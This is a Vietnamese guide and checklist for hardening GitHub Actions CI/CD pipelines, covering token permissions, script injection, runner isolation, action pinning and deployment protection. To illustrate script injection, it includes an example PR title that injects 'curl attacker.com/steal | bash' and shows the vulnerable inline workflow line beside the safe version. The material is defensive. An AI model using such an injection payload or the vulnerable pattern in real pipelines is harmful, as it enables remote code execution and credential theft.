# 🛡️ Security Hardening — Checklist Bảo Mật Toàn Diện

> Security Hardening — Tăng Cường Bảo Mật là tập hợp các biện pháp kỹ thuật và quy trình tổ chức nhằm giảm thiểu bề mặt tấn công (attack surface) và tăng khả năng chống chịu của GitHub Actions pipeline trước các mối đe dọa bảo mật trong môi trường enterprise.

---

## 📚 Mục Lục

1. [Attack Surface GitHub Actions](#attack-surface-github-actions)
2. [Hardening Permissions & Token](#hardening-permissions--token)
3. [Hardening Workflow Inputs](#hardening-workflow-inputs)
4. [Hardening Runner Environment](#hardening-runner-environment)
5. [Hardening Third-party Dependencies](#hardening-third-party-dependencies)
6. [Hardening Deployment Pipeline](#hardening-deployment-pipeline)
7. [Enterprise Governance](#enterprise-governance)
8. [Checklist Toàn Diện Theo Cấp Độ](#checklist-toàn-diện-theo-cấp-độ)
9. [Security Scoring — Đánh Giá Điểm Bảo Mật](#security-scoring)

---

## Attack Surface GitHub Actions

### Các Điểm Tấn Công Chính

```
┌─────────────────────────────────────────────────────────────────┐
│                    Attack Surface Map                           │
│                                                                  │
│  External Triggers (Kích Hoạt Bên Ngoài):                       │
│  ├── Pull Requests từ fork (code không tin tưởng)               │
│  ├── Issue comments trigger workflows                           │
│  ├── Workflow dispatch với user inputs                          │
│  └── Webhook events từ external services                       │
│                                                                  │
│  Workflow Runtime (Môi Trường Chạy):                            │
│  ├── Script injection qua ${{ github.* }} values               │
│  ├── Environment variable pollution                             │
│  ├── Compromised third-party actions                            │
│  └── Runner compromise (self-hosted runners)                   │
│                                                                  │
│  Credentials & Secrets:                                         │
│  ├── GITHUB_TOKEN với quyền quá rộng                           │
│  ├── Long-lived cloud credentials trong Secrets                 │
│  ├── Secrets bị in ra logs                                      │
│  └── Secrets bị lộ qua environment artifacts                   │
│                                                                  │
│  Supply Chain (Chuỗi Cung Ứng):                                 │
│  ├── Third-party actions bị compromised                         │
│  ├── Dependencies với vulnerabilities                           │
│  └── Base Docker images bị nhiễm độc                           │
└─────────────────────────────────────────────────────────────────┘
```

---

## Hardening Permissions & Token

### Nguyên Tắc Least Privilege (Quyền Tối Thiểu)

```yaml
# Template workflow với bảo mật tốt nhất

name: Secure Workflow Template

on:
  push:
    branches: [main]

# RULE 1: Khóa tất cả permissions ở cấp workflow
permissions: {}

jobs:
  build:
    runs-on: ubuntu-latest
    # RULE 2: Chỉ mở permissions cần thiết ở cấp job
    permissions:
      contents: read    # Chỉ đọc code

    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2

  test:
    runs-on: ubuntu-latest
    needs: build
    permissions:
      contents: read
      checks: write     # Ghi kết quả test vào Checks UI

    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - run: npm test

  deploy:
    runs-on: ubuntu-latest
    needs: test
    environment: production
    permissions:
      id-token: write   # OIDC — không cần lưu cloud credentials
      contents: read

    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - name: Deploy via OIDC
        uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4
        with:
          role-to-assume: ${{ vars.AWS_ROLE_ARN }}
          aws-region: ap-southeast-1
```

### Kiểm Tra Permissions Trong Audit

```bash
# Script kiểm tra tất cả workflows không có permissions block
find .github/workflows -name "*.yml" -o -name "*.yaml" | while read f; do
  if ! grep -q "^permissions:" "$f" && ! grep -q "^  permissions:" "$f"; then
    echo "⚠️  THIẾU permissions block: $f"
  fi
done
```

---

## Hardening Workflow Inputs

### Script Injection — Tiêm Mã Thông Qua Input

```yaml
# ❌ NGUY HIỂM — Script Injection
# Kẻ tấn công có thể đặt tên PR là: "; curl attacker.com/steal | bash; echo "
- name: Log PR title
  run: echo "PR: ${{ github.event.pull_request.title }}"

# ✅ AN TOÀN — Dùng biến môi trường
- name: Log PR title
  run: echo "PR: $PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```

### Các Inputs Cần Kiểm Tra Đặc Biệt

```yaml
# Tất cả các giá trị sau đây có thể bị kiểm soát bởi người dùng bên ngoài:
# ${{ github.event.pull_request.title }}
# ${{ github.event.pull_request.body }}
# ${{ github.event.issue.title }}
# ${{ github.event.issue.body }}
# ${{ github.event.comment.body }}
# ${{ github.head_ref }}          -- branch name có thể bị đặt tùy ý
# ${{ github.event.release.tag_name }}

# Luôn truyền qua environment variable, không bao giờ inline
- name: Process user input
  env:
    INPUT_VALUE: ${{ github.event.pull_request.title }}
  run: |
    # Bây giờ $INPUT_VALUE an toàn khi dùng trong shell
    echo "Processing: $INPUT_VALUE"
```

### Validate Workflow Dispatch Inputs

```yaml
on:
  workflow_dispatch:
    inputs:
      environment:
        description: 'Môi trường để deploy'
        required: true
        type: choice
        options:
          - staging
          - production

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Validate input
        run: |
          # Dù type: choice nhưng vẫn nên validate
          if [[ "$ENVIRONMENT" != "staging" && "$ENVIRONMENT" != "production" ]]; then
            echo "::error::Invalid environment: $ENVIRONMENT"
            exit 1
          fi
        env:
          ENVIRONMENT: ${{ inputs.environment }}
```

---

## Hardening Runner Environment

### GitHub-hosted Runners — Bảo Mật Tích Hợp

```yaml
# Mặc định GitHub-hosted runners an toàn:
# ✅ Ephemeral (tạm thời) — mỗi job tạo VM mới, không chia sẻ state
# ✅ Isolated — không thể truy cập jobs khác
# ✅ Xóa sau khi job kết thúc

# Nhưng vẫn cần chú ý:
jobs:
  secure-job:
    runs-on: ubuntu-latest

    steps:
      - name: Không echo secrets ra console
        run: |
          # ❌ Nguy hiểm — secrets sẽ xuất hiện trong logs
          echo "Token: ${{ secrets.MY_SECRET }}"

          # ✅ Đúng — sử dụng qua env var, GitHub tự động mask
          echo "Using token for authentication..."
        env:
          MY_TOKEN: ${{ secrets.MY_SECRET }}  # Tự động được mask trong logs

      - name: Làm sạch sensitive files sau khi dùng
        if: always()
        run: |
          rm -f /tmp/credentials.json
          rm -f ~/.aws/credentials
```

### Self-hosted Runner Hardening

```yaml
# Với self-hosted runners — phức tạp hơn vì không ephemeral
# Cần thêm các biện pháp bảo vệ

# 1. Luôn dùng ephemeral self-hosted runners nếu có thể
# 2. Cách setup ephemeral runner với ARC:
#    runnerScaleSetSettings:
#      maxRunners: 10
#      minRunners: 0
#    ephemeral: true  # Xóa runner sau mỗi job

# Trong workflow, chỉ định runner với labels cụ thể
jobs:
  secure-build:
    runs-on: [self-hosted, ephemeral, secure]
    # Không dùng just `self-hosted` — quá rộng

    steps:
      - name: Checkout (không có persist-credentials)
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          persist-credentials: false  # Xóa credentials sau checkout

      - name: Cleanup sau job
        if: always()
        run: |
          # Xóa tất cả files tạm
          find /tmp -user $(whoami) -delete 2>/dev/null || true
          # Xóa docker containers nếu có
          docker system prune -f 2>/dev/null || true
```

### Network Security Cho Self-hosted Runners

```yaml
# Egress filtering — chỉ cho phép traffic ra ngoài cần thiết
# Cấu hình ở cấp network/firewall, không phải workflow

# Allowlist (danh sách được phép):
# - github.com, api.github.com (GitHub API)
# - *.actions.githubusercontent.com (Actions artifacts)
# - *.pkg.github.com (GitHub Packages)
# - registry-1.docker.io (Docker Hub)
# - *.amazonaws.com (nếu dùng AWS)
# - pypi.org, npmjs.com (package registries)

# Denylist (chặn):
# - Tất cả IP/domain không trong allowlist
# - Metadata service 169.254.169.254 (trừ khi cần)
```

---

## Hardening Third-party Dependencies

### Policy Kiểm Soát Actions

```yaml
# Organization Settings → Actions → General
# → Allow select actions and reusable workflows

# Chính sách khuyến nghị cho enterprise:
# ✅ Allow actions created by GitHub
# ✅ Allow actions by Marketplace verified creators
# ✅ Allow specific actions and reusable workflows:
#    actions/*,
#    aws-actions/*,
#    google-github-actions/*,
#    azure/*,
#    docker/*,
#    hashicorp/*

# ❌ Do NOT allow: Allow all actions (quá nguy hiểm)
```

### Workflow Tự Động Kiểm Tra Actions Không Được Pin

```yaml
name: Check Action Pin Compliance

on:
  pull_request:
    paths:
      - '.github/workflows/**'

permissions:
  contents: read
  pull-requests: write

jobs:
  check-pins:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2

      - name: Kiểm tra actions không được pin bằng SHA
        run: |
          VIOLATIONS=0
          while IFS= read -r file; do
            # Tìm uses: lines không có SHA (40 hex chars)
            while IFS= read -r line; do
              if echo "$line" | grep -qE '^\s+uses:\s+[^@]+@[^#\s]' && \
                 ! echo "$line" | grep -qE '@[0-9a-f]{40}'; then
                echo "::warning file=$file::Action không được pin bằng SHA: $line"
                VIOLATIONS=$((VIOLATIONS + 1))
              fi
            done < <(grep -n "uses:" "$file" 2>/dev/null || true)
          done < <(find .github/workflows -name "*.yml" -o -name "*.yaml")

          if [ "$VIOLATIONS" -gt "0" ]; then
            echo "::error::Tìm thấy $VIOLATIONS actions không được pin bằng SHA"
            exit 1
          fi
          echo "✅ Tất cả actions đều được pin bằng SHA"
```

---

## Hardening Deployment Pipeline

### Environment Protection Rules

```
GitHub Settings → Environments → production
  ✅ Required reviewers: [security-team, tech-lead]
  ✅ Wait timer: 0 minutes (hoặc 5 phút để cancel)
  ✅ Deployment branches: Selected branches → main
  ✅ Prevent self-review: Enabled
  ✅ Required workflows:
      - security-scan.yml (phải pass trước khi deploy)
```

### Workflow Deploy An Toàn Cho Production

```yaml
name: Production Deploy

on:
  workflow_dispatch:
    inputs:
      version:
        description: 'Version để deploy (ví dụ: v1.2.3)'
        required: true
        type: string
      confirm:
        description: 'Gõ DEPLOY để xác nhận'
        required: true
        type: string

permissions: {}

jobs:
  validate:
    runs-on: ubuntu-latest
    permissions:
      contents: read

    steps:
      - name: Validate confirmation
        run: |
          if [ "$CONFIRM" != "DEPLOY" ]; then
            echo "::error::Xác nhận không đúng. Gõ 'DEPLOY' để tiếp tục."
            exit 1
          fi

          if ! echo "$VERSION" | grep -qE '^v[0-9]+\.[0-9]+\.[0-9]+$'; then
            echo "::error::Version không đúng format. Phải là vX.Y.Z"
            exit 1
          fi
        env:
          CONFIRM: ${{ inputs.confirm }}
          VERSION: ${{ inputs.version }}

  security-check:
    needs: validate
    uses: ./.github/workflows/security-scan.yml
    permissions:
      contents: read
      security-events: write

  deploy:
    needs: [validate, security-check]
    runs-on: ubuntu-latest
    environment: production  # ← Required reviewers sẽ được trigger ở đây
    permissions:
      id-token: write
      contents: read

    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2

      - name: Xác thực với AWS qua OIDC
        uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4
        with:
          role-to-assume: ${{ vars.PROD_DEPLOY_ROLE_ARN }}
          aws-region: ap-southeast-1
          role-session-name: prod-deploy-${{ github.run_id }}

      - name: Deploy
        env:
          VERSION: ${{ inputs.version }}
        run: |
          echo "Deploying version $VERSION to production..."
          # Không print AWS credentials hoặc sensitive data ở đây
```

### Immutable Deployments — Triển Khai Bất Biến

```yaml
- name: Deploy immutable artifact (không deploy từ branch)
  run: |
    # ✅ Deploy từ image tag cố định (dùng git SHA, không dùng :latest)
    IMAGE="my-registry/my-app:${{ github.sha }}"

    # Verify image tồn tại trước khi deploy
    docker pull "$IMAGE" || {
      echo "::error::Image $IMAGE không tồn tại — deploy bị hủy"
      exit 1
    }

    # Deploy
    aws ecs update-service \
      --cluster production \
      --service my-service \
      --task-definition $(aws ecs describe-task-definition \
        --task-definition my-task \
        --query "taskDefinition.taskDefinitionArn" --output text)
```

---

## Enterprise Governance

### Organization-level Security Policies

```yaml
# Tạo reusable security workflow dùng chung toàn tổ chức
# my-org/.github/workflows/security-baseline.yml (trong special .github repo)

name: Security Baseline Check

on:
  workflow_call:
    inputs:
      severity-threshold:
        type: string
        default: 'high'

jobs:
  permissions-audit:
    runs-on: ubuntu-latest
    permissions:
      contents: read

    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2

      - name: Kiểm tra workflow permissions
        run: |
          for f in .github/workflows/*.yml .github/workflows/*.yaml; do
            [ -f "$f" ] || continue
            if grep -q "write-all\|permissions: write" "$f"; then
              echo "::error file=$f::Workflow có permissions quá rộng"
            fi
          done
```

### Required Workflow (GitHub Enterprise)

```yaml
# Tổ chức có thể bắt buộc tất cả repos phải chạy workflow này
# Organization Settings → Actions → Required workflows
# → Add workflow: my-org/.github/workflows/security-baseline.yml@main
```

### Audit Log Monitoring

```yaml
name: Security Audit Report

on:
  schedule:
    - cron: '0 8 * * 1'  # Thứ Hai 8:00 sáng — báo cáo hàng tuần

permissions:
  contents: read

jobs:
  audit:
    runs-on: ubuntu-latest

    steps:
      - name: Lấy audit logs qua GitHub API
        run: |
          # Lấy audit logs của org trong 7 ngày qua
          gh api \
            "/orgs/my-org/audit-log?phrase=action:workflows&include=all&per_page=100" \
            --paginate \
            | jq '.[] | select(.action | startswith("workflows"))' \
            > audit-report.json

          # Phân tích các hành động đáng ngờ
          SUSPICIOUS=$(cat audit-report.json | jq -r '
            select(.action == "workflows.approve_workflow_run" and
                   (.actor != .repo_owner))
            | "\(.created_at): \(.actor) approved run in \(.repo)"
          ')

          if [ -n "$SUSPICIOUS" ]; then
            echo "⚠️ Phát hiện approval đáng ngờ:"
            echo "$SUSPICIOUS"
          fi
        env:
          GH_TOKEN: ${{ secrets.ORG_AUDIT_TOKEN }}

      - name: Gửi báo cáo lên Slack
        if: always()
        uses: slackapi/slack-github-action@44c6b0267ceb3f086ef46dac5aef2b85b8e7d8a6 # v2.1.0
        with:
          method: chat.postMessage
          token: ${{ secrets.SLACK_BOT_TOKEN }}
          payload: |
            {
              "channel": "#security-alerts",
              "text": "Weekly GitHub Actions Security Audit Report",
              "attachments": [{
                "color": "warning",
                "text": "Xem report: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}"
              }]
            }
```

---

## Checklist Toàn Diện Theo Cấp Độ

### 🟢 Cấp 1: Cơ Bản (Bắt Buộc Cho Mọi Repository)

**Permissions:**
- [ ] Mọi workflow có `permissions` block tường minh
- [ ] Không dùng `permissions: write-all` trừ khi có lý do đặc biệt
- [ ] Job-level permissions thay vì workflow-level khi có thể

**Secrets:**
- [ ] Không in secrets vào logs
- [ ] Secrets truyền qua env vars, không inline trong run commands
- [ ] Không commit `.env` files và credentials

**Actions:**
- [ ] Tất cả third-party actions được pin bằng SHA
- [ ] Chỉ dùng actions từ nguồn tin cậy
- [ ] Bật GitHub Secret Scanning

### 🟡 Cấp 2: Trung Cấp (Khuyến Nghị)

**Authentication:**
- [ ] Dùng OIDC thay vì long-lived credentials cho cloud
- [ ] GITHUB_TOKEN có minimal permissions
- [ ] Environment secrets thay vì repository secrets cho production

**Supply Chain:**
- [ ] Bật Dependabot cho GitHub Actions
- [ ] Dependency Review trong PR workflows
- [ ] Bật Push Protection

**Scanning:**
- [ ] CodeQL scanning được bật
- [ ] Trivy hoặc Snyk cho container images
- [ ] Gitleaks trong CI pipeline

**Deployment:**
- [ ] Required reviewers cho production environment
- [ ] Branch protection với required status checks
- [ ] Deploy bằng image SHA, không dùng `:latest`

### 🔴 Cấp 3: Nâng Cao (Enterprise)

**Governance:**
- [ ] Organization-level required workflows
- [ ] Allowlist actions tại cấp organization
- [ ] Audit log review tự động hàng tuần

**Runner Security:**
- [ ] Ephemeral self-hosted runners (không share state)
- [ ] Network isolation cho runners
- [ ] Runner trong dedicated VPC, không có public internet access

**Advanced:**
- [ ] SLSA provenance cho production builds
- [ ] Artifact attestation cho Docker images
- [ ] Verify attestation trước khi deploy
- [ ] Custom CodeQL queries cho business logic
- [ ] DAST testing trên staging environment
- [ ] Incident response playbook cho security events

---

## Security Scoring — Đánh Giá Điểm Bảo Mật

### Tính Điểm Bảo Mật Tự Động

```yaml
name: Security Score Check

on:
  push:
    paths:
      - '.github/workflows/**'

permissions:
  contents: read
  pull-requests: write

jobs:
  score:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2

      - name: Tính điểm bảo mật
        id: score
        run: |
          SCORE=100
          ISSUES=()

          for f in .github/workflows/*.yml .github/workflows/*.yaml; do
            [ -f "$f" ] || continue

            # Kiểm tra permissions block (-10 điểm nếu thiếu)
            if ! grep -q "permissions:" "$f"; then
              SCORE=$((SCORE - 10))
              ISSUES+=("[$f] Thiếu permissions block")
            fi

            # Kiểm tra write-all (-20 điểm)
            if grep -q "write-all" "$f"; then
              SCORE=$((SCORE - 20))
              ISSUES+=("[$f] Dùng write-all permissions")
            fi

            # Kiểm tra actions không pin SHA (-5 điểm mỗi cái)
            UNPINNED=$(grep "uses:" "$f" | grep -v "@[0-9a-f]\{40\}" | wc -l)
            if [ "$UNPINNED" -gt "0" ]; then
              SCORE=$((SCORE - UNPINNED * 5))
              ISSUES+=("[$f] $UNPINNED actions không được pin bằng SHA")
            fi
          done

          echo "score=$SCORE" >> $GITHUB_OUTPUT
          printf '%s\n' "${ISSUES[@]}" > issues.txt

          echo "## 🔒 Security Score: $SCORE/100"
          if [ ${#ISSUES[@]} -gt 0 ]; then
            echo ""
            echo "### Vấn Đề Cần Xử Lý:"
            printf '- %s\n' "${ISSUES[@]}"
          fi

      - name: Comment score vào PR
        if: github.event_name == 'pull_request'
        uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea # v7.0.1
        with:
          script: |
            const score = '${{ steps.score.outputs.score }}';
            const emoji = score >= 90 ? '✅' : score >= 70 ? '⚠️' : '❌';
            github.rest.issues.createComment({
              issue_number: context.issue.number,
              owner: context.repo.owner,
              repo: context.repo.repo,
              body: `${emoji} **Security Score: ${score}/100**\n\nXem chi tiết trong [Security workflow run](${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }})`
            });
```

---

## 📊 Ma Trận Mối Đe Dọa vs Biện Pháp

| Mối Đe Dọa | Biện Pháp | File Tham Khảo |
|---|---|---|
| Token bị lộ | Least privilege permissions | [1-permissions.md](./1-permissions.md) |
| Cloud credentials bị lộ | OIDC thay long-lived credentials | [2-oidc-cloud-auth.md](./2-oidc-cloud-auth.md) |
| Supply chain attack | Pin SHA, Dependabot | [3-supply-chain.md](./3-supply-chain.md) |
| Script injection | Env vars, không inline | Phần trên |
| Code có lỗ hổng | CodeQL, Semgrep, Trivy | [4-code-scanning.md](./4-code-scanning.md) |
| Secrets bị commit | Secret scanning, Push Protection | [5-secret-scanning.md](./5-secret-scanning.md) |
| Unauthorized deploy | Environment protection, OIDC | Phần trên |
| Fork PR attack | Dùng `pull_request` thay `pull_request_target` | Phần trên |
| Runner compromise | Ephemeral runners, network isolation | Phần trên |

---

## 🔗 Xem Thêm

- [1-permissions.md](./1-permissions.md) — GITHUB_TOKEN và permissions
- [2-oidc-cloud-auth.md](./2-oidc-cloud-auth.md) — OIDC với cloud providers
- [3-supply-chain.md](./3-supply-chain.md) — Supply chain security
- [4-code-scanning.md](./4-code-scanning.md) — SAST/DAST scanning
- [5-secret-scanning.md](./5-secret-scanning.md) — Secret scanning
- [09-self-hosted-runners/3-security-isolation.md](../09-self-hosted-runners/3-security-isolation.md) — Runner isolation

---

**Cập Nhật Lần Cuối:** 2026-05-12
